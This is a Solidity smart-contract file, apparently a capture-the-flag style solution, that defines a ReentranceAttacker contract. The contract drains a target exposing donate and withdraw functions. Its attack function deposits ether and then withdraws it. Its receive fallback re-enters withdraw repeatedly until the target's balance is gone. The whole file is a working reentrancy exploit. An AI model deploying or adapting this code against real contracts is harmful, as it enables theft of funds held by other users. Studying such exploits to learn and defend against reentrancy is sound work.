// SPDX-License-Identifier: MIT
pragma solidity ^0.7.3;

interface IReentrance {
  function donate(address _to) external payable;
  function withdraw(uint _amount) external;
}

contract ReentranceAttacker {
  address reentrance;
  uint valueToExtract;
  uint increment;

  event Amount(string _msg, uint _amount);
  event Msg(string _msg);

  constructor(address _address) {
    reentrance = _address;
  }

  function attack(uint _valueToExtract) public payable {
    increment = msg.value;
    emit Amount("donate", increment);
    valueToExtract = _valueToExtract;
    IReentrance(reentrance).donate{ value: increment }(address(this));
    emit Amount("withdraw", increment);
    IReentrance(reentrance).withdraw(increment);
  }

  receive() external payable {
    emit Amount("receive", msg.value);
    uint bal = address(reentrance).balance;
    emit Amount("current balance", bal);
    uint amountToWithdraw;
    if (bal > 0) {
      if (bal < increment) {
        amountToWithdraw = bal;
      } else {
        amountToWithdraw = increment;
      }
      emit Amount("reentrantly withdrawing", amountToWithdraw);
      IReentrance(reentrance).withdraw(amountToWithdraw);
    } else {
      emit Msg("Coffers are emptied!");
    }

  }

}
